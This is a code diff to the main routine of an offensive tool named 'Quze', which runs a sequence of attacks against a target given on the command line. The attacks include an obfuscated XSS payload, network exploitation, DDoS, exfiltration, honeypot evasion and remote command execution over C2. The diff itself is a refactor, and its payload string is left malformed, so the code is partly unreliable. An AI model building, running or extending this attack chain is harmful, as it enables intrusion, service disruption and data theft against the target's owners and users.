@@ -25,7 +25,7 @@ import tensorflow as tf
 print("Using TensorFlow version:", tf.__version__)
 print("GPU Available:", tf.config.list_physical_devices('GPU'))
 from concurrent.futures import ThreadPoolExecutor
-
+import argparse
 
 R = "\033[91m"  
 Y = "\033[93m"  
@@ -883,17 +883,19 @@ def attack_execution(target, payload):
     return attack_result, evasive_result  
 
 def main():
-    Quantum_AI()
-    target = input("Enter target domain/IP: ").strip()
-    targets = [target]  
-
+    parser = argparse.ArgumentParser(description="Quze - Quantum Zero-Day Exploitation")
+    parser.add_argument("-t", "--target", help="Target domain/IP", required=True)
+    args = parser.parse_args()
+    
+    target = args.target.strip()
     if not target:
         print("[-] Target cannot be empty!")
         return
-
-    payload = """<script>
-// Quze - Advanced XSS Payload
-(function() {
+    
+    print(f"[*] Running Quze attack on {target}...")
+    
+    Quantum_AI()
+    payload = """
     // Step 1: Encode and decode payload for evasion (Base64 Obfuscation)
     var b64 = "Y29uc29sZS5sb2coIkxhb2RhIFhTUyIpOw==";  // Base64 encoded script: console.log("Load XSS")
     var decoded = atob(b64);  // Decode the base64 string
@@ -927,26 +929,21 @@ def main():
 
 })();
 </script>"""
-key = base64.b64decode("UXVhbnR1bTEyMw==").decode()
-print("[*] Initiating execution of all attacks...")
-    # Pastikan pemanggilan fungsi benar
-model = load_ml_model()
-if model is None:
-    print('[-] Model failed to load, terminating execution.')
-    exit()
-
+    key = base64.b64decode("UXVhbnR1bTEyMw==").decode()
+    
+    model = load_ml_model()
     if model:
         payload = ai_payload_mutation_v2(model, payload)
-
+    
     setup_vpn()
     setup_proxy()
-
+    
     quantum_data_integrity_check(payload)
     network_exploitation(target, payload)
     quantum_attack_simulation(target, payload, "basic")
     avoid_honeypot(target)
     autonomous_reconnaissance(target)
-    distributed_quantum_attack(targets, payload)
+    distributed_quantum_attack([target], payload)
     zero_trust_penetration_v2(target)
     quantum_exfiltration(payload, key)
     network_reconnaissance(target)
@@ -954,18 +951,17 @@ if model is None:
     autonomous_feedback_loop(target, payload)
     simulate_evasive_payload(target)
     quantum_ddos_attack(target)
-    distributed_quantum_reconnaissance(targets)
-    self_healing_attack_automation(targets, payload)
-    quantum_penetration_test(targets, [payload])
+    distributed_quantum_reconnaissance([target])
+    self_healing_attack_automation([target], payload)
+    quantum_penetration_test([target], [payload])
     dao_c2_command("echo 'test command'")
-    quantum_c2_command_execution("ls -la", targets)
+    quantum_c2_command_execution("ls -la", [target])
     advanced_quantum_penetration(target)
-
+    
     evasive_payload = quantum_multi_layer_evasion(payload)
-
     attack_execution(target, evasive_payload)
-
+    
     print("[+] All attacks have been executed. Cleaning up and closing connections...")
-
+    
 if __name__ == "__main__":
     main()
